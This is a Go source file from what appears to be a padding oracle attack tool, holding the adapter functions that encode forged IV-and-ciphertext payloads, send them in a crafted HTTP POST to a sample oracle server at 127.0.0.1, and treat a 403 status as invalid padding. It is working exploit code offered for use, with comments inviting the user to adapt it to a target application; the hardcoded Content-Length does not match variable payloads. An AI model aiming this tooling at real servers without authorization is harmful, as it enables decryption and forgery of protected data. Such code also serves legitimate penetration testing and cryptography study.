package libpadoracle

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

// EncodePayload turns the raw oracle payload (IV + Ciphertext) into whatever format is required by the endpoint server. Modify this routine to suit the specific needs of the application.
func EncodePayload(RawPadOraclePayload []byte) (encodedPayload string) {
	encodedPayload = base64.StdEncoding.EncodeToString(RawPadOraclePayload)
	return encodedPayload
}

// DecodePayload is used to decode the initial CipherText payload provided as a CommandLine Argument
func DecodeCiphertextPayload(EncodedPayload string) []byte {
	var decoded []byte
	//****** EDIT this function to suit your particular ciphertext's encoding. ********//
	// This function should return a byte array of the ciphertext's raw bytes //
	decoded, err := base64.StdEncoding.DecodeString(EncodedPayload)
	Check(err)
	fmt.Println(decoded)
	return decoded
}

// DecodeIV decodes the optionally-supplied Block0 initialisation vector. Modify the decode routine to suit the format of the supplied IV
func DecodeIV(IV string) []byte {
	return DecodeCiphertextPayload(IV)
}

// CallOracle actually makes the HTTP/whatever request to the server that provides the padding oracle. Modify this to suit your application's needs.
func CallOracle(encodedPayload string) (*http.Response, string) {
	// Sample
	var client http.Client
	reqData := fmt.Sprintf(`POST / HTTP/1.1
Host: 127.0.0.1:12345
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3315.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
Content-Length: 322

%s`, encodedPayload)
	x := bufio.NewReader(strings.NewReader(reqData)) //wtf? bufio/io.reader is DUMB
	req, err := http.ReadRequest(x)
	Check(err)
	resp, err := client.Do(req)
	Check(err)
	defer resp.Body.Close() // Return the response data back to the caller

	var bodyString string
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	Check(err)
	bodyString = string(bodyBytes)
	return resp, bodyString
}

// CheckResponse tells the program whether the padding was invalid or not. Modify to suit the application's response when invalid padding is detected.
func CheckResponse(resp *http.Response, strResponseBody string) bool {
	// Sample - the server's response includes the string "Invalid Padding"
	if resp.StatusCode == 403 {
		return false // Padding was bad!
	}
	return true
}
